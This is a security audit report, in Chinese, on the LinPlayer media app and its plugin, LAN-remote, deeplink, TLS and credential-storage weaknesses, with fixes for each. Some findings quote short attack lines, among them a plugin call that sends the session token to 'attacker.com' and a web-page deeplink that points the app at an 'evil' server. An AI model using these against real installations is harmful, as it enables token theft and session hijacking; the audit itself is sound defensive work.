# LinPlayer 安全审计报告

> 生成日期：2026-06-20 · 方式：本地静态审计 + 关键路径人工复核 + npm audit 联网校验
> 范围：Flutter/Dart 主应用、Android/TV、Windows/macOS/Linux 原生壳、Apple TV Swift 客户端、OAuth proxy/site、插件系统与发布脚本。
> 限制：未做真实设备动态渗透、未执行 MITM/PoC 攻击、`flutter pub outdated --json` 未能返回结果（疑似网络/工具卡住），因此 Dart/Flutter 依赖 CVE 需后续单独复跑。

## 1. 总体结论

LinPlayer 在三个外部攻击面（QuickJS 插件系统、TV 局域网遥控、deeplink/网络）上存在系统性的"信任边界缺失"，核心问题是**对外部输入（插件清单、LAN 请求、deeplink、下载产物、TLS 证书）普遍缺乏校验与用户确认**。此外，Apple TV 独立 Swift 客户端也复现了同类 TLS 与凭据落盘问题。最致命的三类为：

- **Top 1 — 全局禁用 TLS 证书校验**（`proxy_http_client.dart:96`：`badCertificateCallback => true` 对全 App 所有 Dio 客户端生效）。任意同网攻击者可透明 MITM 抓取 Emby 账号密码/Token、篡改任意响应，并直接打通"自动更新无校验"链条达成代码执行。
- **Top 2 — 自动更新下载二进制无 TLS、无签名/哈希校验**（`update_installer.dart:91`），叠加 Top1 后，MITM 可投递任意 APK/可执行文件交给系统安装器，构成远程代码执行入口。
- **Top 3 — TV 局域网遥控所有 `/api/*` 端点零鉴权**（`lan_remote.dart`），同网任意设备可枚举服务器、注入/重写服务器配置并劫持当前会话，造成服务器替换与流量重定向。

---

## 2. 确认发现（按严重级别）

> 严重级别采用对抗验证后的"调整后多数判定"。两条原标 Critical/High 的下载链经多数复核调整为 High（受平台签名校验/手动执行环节约束）。

### High

**H1. 全局禁用 TLS 证书校验，影响 App 全部 HTTPS 流量**
`lib/core/network/proxy_http_client.dart:96-97`（及 `133-134`）
- 场景：`createProxiedHttpClient()` 无条件设 `badCertificateCallback = (_,_,_) => true`，经 `applyProxyToDio` 注入到 Emby API、下载、WebDAV、预加载、跳过片头、图片加载、**自动更新**等所有 Dio。无论是否配置代理都生效。同网/恶意热点/ISP 级 MITM 可透明截获 HTTPS，窃取登录用户名密码与 `X-Emby-Token`，并篡改任意 API/媒体/更新响应。
- 修复：默认走标准校验（移除回调）；若需支持自签名 Emby，改为"按服务器显式开启不安全 TLS"的逐主机白名单，**绝不**应用于更新下载与 WebDAV；理想做法是导入并固定该服务器的 CA。
- 工作量：中（需引入 per-server 开关 + UI），但移除全局回调本身是一行。

**H2. 自动更新二进制经 TLS-禁用客户端下载且无签名/哈希校验（MITM → 代码执行）**
`lib/core/services/update/update_installer.dart:91-98`
- 场景：更新器 `applyProxyToDio(dio)` 后 `dio.download(asset.url, savePath)`，证书校验全局关闭且全程无 SHA256/签名比对。MITM 可伪造更新主机证书、投递恶意 .apk/.exe，Android 直接交 `OpenFilex` 给系统安装器。Android 自身同签名校验与桌面"仅在文件管理器揭示"略微约束直达 RCE，故复核定为 High。
- 修复：更新客户端强制严格 TLS（禁用 bypass 工厂）；下载后比对来自可信通道（签名 release manifest / 经校验 TLS 的 GitHub API）的 SHA256 或发布者签名，校验失败即删除产物、失败关闭。
- 工作量：中。

**H3. emby.apiRequest 存在 SSRF，可携带 Emby Token 请求任意主机（Token 外泄）**
`lib/plugins/runtime/plugin_context_bridge.dart:321-348`
- 场景：持 `emby.api` 的插件调用 `ctx.emby.apiRequest({path:'//attacker.com/collect'})`，`Uri.parse(base).resolve(path)` 对 `//host` 或绝对 URL 会替换主机，但仍附带 `X-Emby-Token: server.authToken` → 实时会话 Token 发往攻击者主机。同权限 `_http` 桥已强制 HTTPS+白名单，本路径却缺失。
- 修复：解析后断言 `resolved.origin == Uri.parse(base).origin`；或剥离前导 `/`、`//` 并禁止 path 含 scheme/authority，不允许插件改写接收 Token 的主机。
- 工作量：低（数行校验）。

**H4. 已启用插件更新/重装时静默权限提权（绕过同意）**
`lib/plugins/manager/plugin_manager.dart:156-186, 261-304`
- 场景：用户同意并启用了仅声明 `['storage']` 的插件，其 id 持久化进 `_enabledIds`。`install()` 覆盖同 id 目录但不清除启用态、不再次征求同意；攻击者发布同 id 的 v2 清单声明 `['emby.credentials','http','emby.api']`，下次 `scan()` 用**新清单**构建 `PluginGrantedPermissions(info.manifest.permissions)` 自动激活，提权权限从未弹过同意框。
- 修复：按 id 持久化"已同意权限集"，激活/扫描时与清单比对，发现新增权限则强制 disabled 并重新走 `showPluginPermissionConsent`；`install()` 覆盖同 id 时清除启用态与已同意集。
- 工作量：中。

**H5. http 权限实为无限制 HTTPS 出网；"域名白名单"由插件自定义且可选，误导同意框**
`lib/plugins/runtime/plugin_context_bridge.dart:108-160`
- 场景：同意文案称"受域名白名单限制"，但 `httpAllowedHosts` 来自插件自身清单 `manifest.raw['httpAllowedHosts']`，且仅当 `isNotEmpty` 才强制。恶意插件省略该字段 → 列表为空 → 放行任意 HTTPS 主机，可将其能读到的数据 POST 到 attacker.com。
- 修复：白名单不得由插件自定义；空列表视为 deny-all，或在同意框中具体展示并绑定用户同意的允许主机；空/缺失绝不等于"放行任意主机"。
- 工作量：低-中。

**H6. LAN 遥控所有命令/控制端点无任何鉴权**
`lib/tv/services/lan_remote.dart:210-244`（端点 222-233）
- 场景：服务绑定 `InternetAddress.anyIPv4:8920`，`_handle()` 无 token/配对/每请求密钥。同网任意设备 `GET /api/state` 即可枚举所有服务器 baseUrl/线路/名称，并 `POST /api/cmd|setting|server|server-add` 全功能生效。二维码仅编码 URL 不含密钥。开启遥控期间完全开放。
- 修复：`start()` 时生成随机会话 token，嵌入 URL/二维码，每个 `/api/*` 请求校验（header 或 query），不符返回 401；并校验 Host 头防 DNS rebinding，首次配对加 TV 端确认。
- 工作量：中。

**H7. /api/server-add 无鉴权无校验注入流氓媒体服务器与弹幕源**
`lib/tv/services/lan_remote.dart:232, 397-460`
- 场景：`POST /api/server-add` 接受任意 `text`，`authenticateBlock` 后 `addServer` 并对首个块 `currentServerProvider = server` + `authStateProvider = authenticated`，还批量加入弹幕自定义源。叠加无鉴权，LAN 攻击者把 baseUrl/线路指向自控主机即可静默切换当前服务器，后续浏览/播放/Token/流量全经攻击者基础设施——完整的服务器替换与流量重定向原语。
- 修复：要求会话 token（H6）；远程发起的添加/切换服务器必须经 TV 端显式确认，绝不自动提升为 current/authenticated。
- 工作量：中。

**H8. /api/server 无鉴权覆写既有服务器配置（名称、图标、活动线路 URL）**
`lib/tv/services/lan_remote.dart:230, 354-393`
- 场景：先 `GET /api/state` 拿到服务器 id，再 `POST /api/server` 用该 id 提交 `lines` 指向攻击者主机 + `activeLineIndex`，`copyWith` 后 `updateServer`，若为当前服务器则同步 `currentServerProvider` 为篡改副本——既有可信服务器被静默重指向攻击者 URL，全流量 MITM，无需用户添加任何东西且持久化。
- 修复：要求会话 token（H6），配置变更端点经 TV 端确认；校验/规范化提交的 URL 并向用户提示变更。
- 工作量：中。

**H9. linplayer://add-server 无确认即添加+认证+激活服务器（网页/二维码 drive-by）**
`lib/core/services/deep_link_service.dart:56-102`
- 场景：`_handle()` 全自动处理 `linplayer://add-server?...`：用攻击者参数 `authenticateBlock`、`addServer`、设 `currentServerProvider`、置 `authStateProvider=authenticated`、合并弹幕源、跳首页，全程无 `showDialog`。恶意网页 `location.href='linplayer://add-server?...&line=https://evil'` 或扫码即触发；Windows 首次运行自动注册 HKCU 协议。结果：当前服务器/会话被静默切到攻击者 Emby，首页/媒体库/图片/播放流全来自攻击者（内容伪造/钓鱼/流量重定向）。
- 修复：deeplink 添加服务器必须经显式确认对话框（展示 server 名/host/用户名）后才 `authenticateBlock/addServer`；绝不从 deeplink 直接设 `currentServerProvider`/`authStateProvider`；至少添加为非活动状态由用户选择。
- 工作量：低-中。

**H10. Emby 登录密码与 Token 经常驻 dio LogInterceptor 明文记录**
`lib/core/api/emby_api.dart:53-54`（拦截器）、`192-195`（登录体）、`40 & 168-174`（Token/api_key）
- 场景：每个 `EmbyApiClient` 无条件挂 `LogInterceptor(requestBody:true)`（未受 kDebugMode 门控），登录 POST 体含明文 `Pw`，后续请求打印 `X-Emby-Token` 与 `api_key`。
- 复核校正：dio 5.9.2 默认 `logPrint` 在 `assert` 内调 `print`，release/profile 会被剥离，故 LogInterceptor 输出**仅 debug 构建**出现，非生产泄露向量。但 `login()` 的 `catch` 分支用 `debugPrint`（release 仍执行）在登录失败时打印含密码的 request data，是独立的真实 release 路径。
- 修复：移除 LogInterceptor，或仅 `kDebugMode` 且自定义 `logPrint` 脱敏 `Pw`/`X-Emby-Token`/`api_key`；release 绝不记录认证请求体，登录失败也不打印 request data。
- 工作量：低。

**H11. 服务器密码/Token/userId 以明文存于磁盘（SharedPreferences）**
`lib/core/providers/server_providers.dart:30, 293-314, 241, 343`；`app_preferences.dart:8`
- 场景：`ServerConfig` 列表（含 `password`/`authToken`/`userId`）`jsonEncode` 后写入 SharedPreferences key `linplayer_servers`，底层为未加密 XML/plist/文件。具文件系统/备份访问者直接读明文密码与长效 Token → 账号接管。对比：sync OAuth token 做了混淆，更高价值的 Emby 密码反而明文，保护不一致。
- 修复：密码/Token 改用 OS keychain（flutter_secure_storage），或至少套用现有 XOR 混淆；更佳是不持久化明文 `password`（只存 Token）。
- 工作量：中。

**H12. 备份导出将服务器密码与 Token 明文写入文件（本地/WebDAV）且无警告**
`lib/ui/screens/settings/settings_backup_restore.dart:104-144, 287-332`；`settings_screen.dart:87-92`
- 场景：`_buildBackupPayload` 对每个服务器调 `serverConfigToJson`（含明文 `password`/`authToken`）。本地导出原样写入 `linplayer-backup.json`；WebDAV 同样明文上传到稳定路径 `/LinPlayer/backups/settings_latest.json`。对话框未提示含明文凭据。攻击者获取备份文件即读取所有密码与 Token。
- 修复：序列化前剥离或加密 `password`/`authToken`，或用用户口令加密整个 payload；至少醒目警告并拒绝明文 HTTP WebDAV 目标。
- 工作量：低-中。

**H13. Apple TV Swift 客户端全局信任任意 TLS 证书，且允许任意明文加载**
`apple_tv/LinPlayerTV/Services/EmbyApiClient.swift:31-32, 452-460`；`apple_tv/LinPlayerTV/Info.plist:25-29`
- 场景：Apple TV 客户端用 `InsecureSessionDelegate` 对所有 `serverTrust` 直接 `URLCredential(trust:)`，等价于信任任意服务器证书；同时 `NSAllowsArbitraryLoads=true` 允许 ATS 明文/任意加载。攻击者可在同网或恶意热点 MITM Apple TV 端的 Emby 登录、Token、图片、播放地址。
- 修复：移除 `InsecureSessionDelegate`，默认使用系统 TLS 校验；如确需自签名服务器，按单个服务器显式启用并做证书/公钥 pinning；收紧 ATS，至少只对用户确认的局域网 HTTP 服务器做例外。
- 工作量：中。

### Medium

**M1. ctx.emby.getCredentials() 返回明文用户名+密码，无作用域、无独立吊销**
`lib/plugins/runtime/plugin_context_bridge.dart:303-311`
- 场景：持 `emby.credentials` 插件得到 `{username, password, url}`，`password` 为真实明文账号密码。叠加 H5 无限制出网，一次调用即可外发。同意为一次性弹框，无逐次提示/时限/作用域，唯一吊销是禁用整个插件。
- 修复：避免把原始密码交给插件，改为主机侧对批准域登录、仅返回会话 token 的 host-bound 代理；如必须给原始凭据，逐次确认 + 明确警告 + 加密静态存储。
- 工作量：中。

**M2. 命令总线注入：任意 action 字符串被转发给播放器（任意 LAN 设备）**
`lib/tv/services/lan_remote.dart:226, 315-326`
- 场景：`POST /api/cmd` 把任意 `action`/`value` 无白名单送 `LanRemoteBus`，播放页执行。叠加无鉴权，任意 LAN 设备可暂停/seek/切集或 `playEpisode` 强制播放指定 item id。影响以播放控制为界。
- 修复：要求会话 token（H6）；`action` 固定白名单，未知动作 400。
- 工作量：低。

**M3. 服务绑定 anyIPv4 + 通配 CORS，扩大可达面并启用浏览器驱动攻击**
`lib/tv/services/lan_remote.dart:148, 153, 212-214`
- 场景：`bind(InternetAddress.anyIPv4)` 暴露所有接口；`Access-Control-Allow-Origin:*` + 允许 POST，使受害者浏览的任意网页可跨域 POST 到 `http://<tv-ip>:8920/api/*` 并读响应；无 Host 头校验，结合 DNS rebinding 可无 LAN 立足点驱动 `/api/server-add` 与 `/api/cmd`。
- 修复：去通配 CORS；校验 Host 头防 rebinding；绑定具体 LAN 接口；配合 H6 token。
- 工作量：低。

**M4. deeplink 凭据被 POST 到攻击者提供的 URL，无主机校验**
`lib/core/utils/server_batch_adder.dart:46-72`
- 场景：deeplink 中 `line=`/`text=` 原样传入 `EmbyApiClient(baseUrl:url).auth.login(user,pwd)`，user/pwd 同源自不可信链接。可使 App 把任意凭据对发往任意主机；`line=http://...` 还明文传输。
- 修复：deeplink URL 与凭据视为完全不可信，强制 https 拒绝 http，登录前确认目标主机，不自动登录；考虑拒绝在 deeplink 内嵌凭据。
- 工作量：低-中。

**M5. 翻译引擎 API key / secretKey 明文存于 SharedPreferences**
`lib/core/providers/translation_providers.dart:73-104, 116-134`；`translation_engine.dart:93-94, 144-149, 196-201`
- 场景：OpenAI/Anthropic/Baidu/Tencent 的 `apiKey`/`secretKey`/`secretId` 明文写入 SharedPreferences。磁盘/备份访问者可读取这些付费凭据刷账单。相比刻意混淆的 sync token，毫无保护。
- 修复：用 flutter_secure_storage/OS keychain，或至少套用现有 XOR 混淆；从未加密备份中排除。
- 工作量：低-中。

**M6. ffmpeg 静态二进制下载后无校验即执行（MITM/第三方主机被攻陷 → RCE）**
`lib/core/services/translation/whisper/desktop_binary_manager.dart:79-126`；执行于 `whisper_audio_extractor.dart:65, 26`
- 场景：从 gyan.dev/evermeet.cx/johnvansickle.com 拉静态 ffmpeg，解包写入 `<AppSupport>/bin/ffmpeg`，`chmod +x` 后 `Process.run`，全程无 SHA256/PGP/签名校验，每次启动自动信任缓存。现实向量为 TLS-MITM（恶意 CA）或第三方下载主机被攻陷（供应链）。
- 修复：下载前固定并校验各平台 SHA256（或代码签名/GPG），首次执行前再校验；优先自托管固定构建，不匹配则删除失败关闭。
- 工作量：中。

**M7. 更新 APK/安装包交系统安装器前无签名/哈希校验**
`lib/core/services/update/update_installer.dart:68-128, 108-118`；`asset.url` 来自 `app_update_service.dart:125`
- 场景：从 `browser_download_url` 下载并 Android 直接 `OpenFilex`，无哈希/签名比对。元数据主机为硬编码 HTTPS GitHub（不可被重定向），但下载客户端复用 H1 禁证书校验客户端使 HTTPS 失效；Android 同签名校验提供 OS 级兜底，故 Medium（防御纵深缺口）。
- 修复：从签名 release 元数据校验 SHA256 后再调安装器；更新下载不得复用禁证书校验客户端（H1 根因）。
- 工作量：中。

**M8. deeplink 意图无确认即添加服务器凭据并登录（任意浏览器/应用）**
`lib/core/services/deep_link_service.dart:56-102`；`AndroidManifest.xml:38-43`
- 场景：MainActivity 以 BROWSABLE `linplayer://` 导出，`_handle()` 无确认即 `authenticateBlock/addServer/设当前/置 authenticated/加弹幕源`。任意网页/应用可触发静默配置流氓 Emby 为活动服务器；line 不限 https。（与 H9/M4 为同一面不同切面。）
- 修复：添加+认证前显式确认对话框展示 host/用户名；校验规范化 URL（拒非 http(s)）；不从未确认外部链接自动设 authState/当前服务器。
- 工作量：低-中。

**M9. Apple TV 服务器 Token 明文存于 UserDefaults**
`apple_tv/LinPlayerTV/Services/ServerManager.swift:8, 48, 58-69`
- 场景：Apple TV 端把 `ServerConfig` 编码后写入 `UserDefaults.standard` 的 `linplayer_servers`，其中 `accessToken`/`userId` 会随服务器配置明文保存。具备本地备份、调试或沙箱文件访问能力者可恢复 Emby 会话。
- 修复：Token 改存 Keychain；`UserDefaults` 只保存非敏感服务器元数据和 token 引用 id；登出/删除服务器时同步清理 Keychain。
- 工作量：低-中。

**M10. Android 未显式关闭自动备份，SharedPreferences 凭据可能进入系统/云备份**
`android/app/src/main/AndroidManifest.xml:11-16`
- 场景：`<application>` 未设置 `android:allowBackup="false"`、`fullBackupContent` 或 Android 12+ `dataExtractionRules`。结合 H11，明文 `linplayer_servers` 可能被系统备份/迁移带走，扩大凭据暴露范围。
- 修复：若不需要迁移敏感配置，设置 `android:allowBackup="false"`；若需要备份，配置 data extraction rules 排除含凭据的 SharedPreferences，并先完成 H11 secure storage。
- 工作量：低。

### Low

**L1. ctx.http 默认跟随重定向，白名单主机可 302 跳到名单外/内网**
`lib/plugins/runtime/plugin_context_bridge.dart:120-160` — 设 `followRedirects:false`（或 `maxRedirects:0`），或每跳重校验白名单。工作量：低。

**L2. 插件墙钟实为 30s（非简报 8s），无并发/总内存全局上限**
`lib/plugins/runtime/plugin_runtime.dart:28`；`plugin_context_bridge.dart:382-394` — 降同步处理器超时、加并发插件数与总内存上限、更新过时文档。工作量：低。

**L3. 安装包（.ipk/.lpk/.zip）无签名/完整性校验**
`lib/plugins/manager/plugin_installer.dart:41-95` — 要求分离签名 + 可信公钥校验，拒绝以不同密钥覆盖既有 id。（实际安装为 disabled、启用仍需弹框，故 Low。）工作量：中。

**L4. Whisper GGML 模型下载无哈希校验，mirrorBase 接受 http://**
`lib/core/services/translation/whisper/whisper_model_manager.dart:49-92` — 每模型固定 SHA256，重命名前校验；拒非 https mirrorBase。工作量：低。

**L5. sync OAuth token / client secret 用静态密钥 XOR 混淆却标称 "secure"**
`lib/core/services/sync/sync_secure_store.dart:16-45`；`obfuscated_secrets.dart:14-30` — 改 OS 安全存储或诚实改名去掉 "Secure"。（影响有界，代码注释已诚实承认。）工作量：低。

**L6. linplayer://add-server 的弹幕源 apiUrl 无确认即被加为可信查询端点**
`lib/core/services/deep_link_service.dart:88-95` — 与服务器添加共用确认门槛、强制 https、展示 host；不静默并入全局源。工作量：低。

**L7. mpv argv 缺少 `--` 选项终止符（防御纵深）**
`lib/core/services/external_player/external_player_session_service.dart:56-74` — 在 `videoUrl` 前插入字面 `'--'`。工作量：极低。

**L8. Windows 单实例 deeplink 转发按窗口类/标题信任任意窗口（本地）**
`windows/runner/main.cpp:31-43` — 单实例改用命名互斥量 + 每用户随机后缀唯一隐藏窗口。（接收侧发送者校验已由 app_links 7.1.2 实现。）工作量：低。

**L9. Windows %1 / 单实例转发 argv 突破（信息性，当前不可利用）**
`windows/runner/main.cpp:18-44` — Dart `main()` 不读 entrypoint args，无注入 sink，一位复核判 NotAVuln。仅前瞻标记。

**L10. OAuth proxy site 依赖存在 1 个中危 npm audit 告警**
`oauth-proxy/site/package-lock.json`；联网执行 `npm audit --json`
- 结果：`dompurify <= 3.4.10`，GHSA-cmwh-pvxp-8882，severity=moderate，CWE-79/CWE-471/CWE-665，`fixAvailable: true`。这是站点依赖链风险，不影响 Flutter 主 App 运行时，但会影响 `oauth-proxy/site` 构建/托管内容。
- 修复：在 `oauth-proxy/site` 执行 `npm audit fix` 或升级相关上游包，复跑 `npm audit --json` 确认 0 漏洞。
- 工作量：低。

---

## 3. 已排查但判定不成立

- **SOCKS 代理主机预解析缓存为 IP（stale/rebinding 不匹配）** — `proxy_http_client.dart:31-54, 76-90`：机制属实，但代理主机为用户自配基础设施、非攻击者可控，不跨越安全边界、无 SSRF 校验绑定该 IP，判为 NotAVuln（提交者亦自述无需安全处置）。
- **插件包 Zip Slip** — `plugin_installer.dart:63-79, 159-162`：安装前删除目标 id 目录，然后每个条目经 `_safeJoin()` + `p.isWithin()` 校验后写入；未发现 `../` 或绝对路径逃逸到插件目录外的路径。

## 4. 依赖与工具校验

- `npm audit --json`（目录 `oauth-proxy/site`）：已联网完成，发现 1 个 moderate（见 L10）。
- `flutter pub outdated --json`：本次命令长时间无输出且无法正常中断，`Get-Process flutter,dart` 未发现残留进程。Dart/Flutter 依赖漏洞库校验未完成，建议后续在网络稳定环境复跑 `flutter pub outdated` 与 `dart pub outdated`，再人工对照安全公告。
- 本地 secret 扫描：未发现典型私钥块、AWS/OpenAI 风格裸密钥；发现的 `secret/client_secret/token/password` 多为配置字段、环境变量引用或用户数据存储路径，相关真实风险已归入 H11/M5/L5/L10。

---

## 5. 建议修复顺序

1. **立即（一行/数行即可拆掉系统性根因）**：H1 移除全局 `badCertificateCallback => true`（或改 per-server 白名单）；H13 移除 Apple TV `InsecureSessionDelegate`；同步修 H2/M7 让更新下载强制严格 TLS。消除全 App MITM 与更新链 RCE 的共同根因。
2. **高危外部面收口**：H6 给 LAN 遥控加会话 token（一并堵住 H7/H8/M2/M3）；H9/M8/M4/L6 给 deeplink 加确认对话框 + 强制 https + 不自动激活会话（同一处改动覆盖多条）。
3. **插件信任边界**：H3 SSRF origin 校验、H4 持久化已同意权限集并 scan 比对、H5 白名单不可由插件自定义；随后 M1、L1/L3。
4. **凭据静态保护**：H10 脱敏/门控日志、H11/M9 改 secure storage/Keychain、H12/M5 备份与翻译 key 加密或排除、M10 配置 Android 备份排除。
5. **下载产物完整性**：M6 ffmpeg、L4 Whisper 模型加 SHA256/签名校验与 https 强制。
6. **防御纵深/本地面**：L2 插件资源全局上限、L5 sync 存储改名/加固、L7 mpv `--`、L8/L9 Windows 单实例硬化、L10 更新 npm 依赖。

> 依赖侧提示：`archive 3.6.1` 是唯一安全相关偏旧依赖（解包不可信 .ipk/.lpk），确认解包代码已规范化条目路径（拒绝绝对路径与 `..`）并考虑升级 4.x；`socks5_proxy 1.0.6` 维护性风险，值得人工复看。
